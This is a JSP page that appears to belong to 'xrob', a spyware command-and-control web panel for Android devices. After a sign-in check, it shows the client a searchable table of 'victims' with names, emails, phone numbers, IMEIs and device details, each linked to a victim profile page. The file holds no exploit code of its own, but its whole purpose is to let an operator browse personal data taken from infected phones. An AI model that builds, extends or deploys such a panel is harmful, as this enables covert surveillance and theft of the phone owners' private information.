<%@ page import="com.theah64.xrob.api.models.Victim" %>
<%@ page import="java.util.List" %>
<%@ page import="com.theah64.xrob.api.database.tables.Victims" %>
<%@ page import="com.theah64.xrob.api.utils.CommonUtils" %>
<%--
  Created by IntelliJ IDEA.
  User: theapache64
  Date: 12/9/16
  Time: 4:08 PM
  To change this template use File | Settings | File Templates.
--%>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%@include file="signin_check.jsp" %>

<html>
<head>
    <title>Client panel</title>
    <%@include file="../common_headers.jsp" %>
    <script>
        $(document).ready(function () {

            //Row click
            $("table#tVictims td.clickable_data").click(function () {
                window.document.location = $(this).parent().data("href");
            });

            $(document).ready(function () {

                var $rows = $('table#tVictims tr.data_row');
                $('input#iSearch').keyup(function () {

                    var val = '^(?=.*\\b' + $.trim($(this).val()).split(/\s+/).join('\\b)(?=.*\\b') + ').*$',
                            reg = new RegExp(val, 'i'),
                            text;

                    $rows.show().filter(function () {
                        text = $(this).text().replace(/\s+/g, ' ');
                        return !reg.test(text);
                    }).hide();
                });

            });


        });
    </script>
</head>
<body>
<div class="container">
    <%@include file="header.jsp" %>

    <%
        final List<Victim> victims = Clients.getInstance().getVictims(session.getAttribute(Clients.COLUMN_ID).toString());
        if (victims != null) {

    %>

    <div class="row">
        <%--Generate table here--%>
        <div class="col-md-12 content-centered">

            <div class="row" style="margin-bottom: 20px;">
                <div class="col-md-8 pull-left">
                    <h4>
                        You've <%=CommonUtils.getProperSentense(victims.size(), "one victim", victims.size() + " victims")%>
                    </h4>
                </div>

                <div class="col-md-4 pull-right">
                    <div class="input-group">
                            <span class="input-group-addon">
        <i class="glyphicon glyphicon-search"></i>
    </span>
                        <input id="iSearch" placeholder="Search" type="text" class="form-control"/>
                    </div>
                </div>
            </div>

            <table id="tVictims" class="table table-bordered">
                <tr>
                    <th>Name</th>
                    <th>Email</th>
                    <th>Phone</th>
                    <th>IMEI</th>
                    <th>Device</th>
                    <%-- <th>Device info</th>--%>
                </tr>

                <%
                    for (final Victim victim : victims) {
                %>
                <tr class="data_row" data-href="/client/victim/profile/<%=victim.getVictimCode()%>">
                    <td class="clickable_data"><%=victim.getName()%>
                    </td>
                    <td class="clickable_data"><%=victim.getEmail()%>
                    </td>
                    <td class="clickable_data"><%=victim.getPhone()%>
                    </td>
                    <td class="clickable_data"><%=victim.getIMEI()%>
                    </td>
                    <td data-toggle="collapse" data-target="#<%=victim.getId()%>"><%=victim.getDeviceName()%><span
                            class="label label-default pull-right">more...</span>

                        <div id="<%=victim.getId()%>" class="collapse">
                            <%=Victim.getDeviceInfoReadable(victim.getOtherDeviceInfo())%>
                        </div>
                    </td>
                </tr>

                <%
                    }
                %>

            </table>

        </div>

    </div>
    <%


    } else {
    %>


    <div class="row">
        <h1 class="text-danger text-center">No victim connected!</h1>
    </div>


    <%
        }
    %>

</div>
</body>
</html>
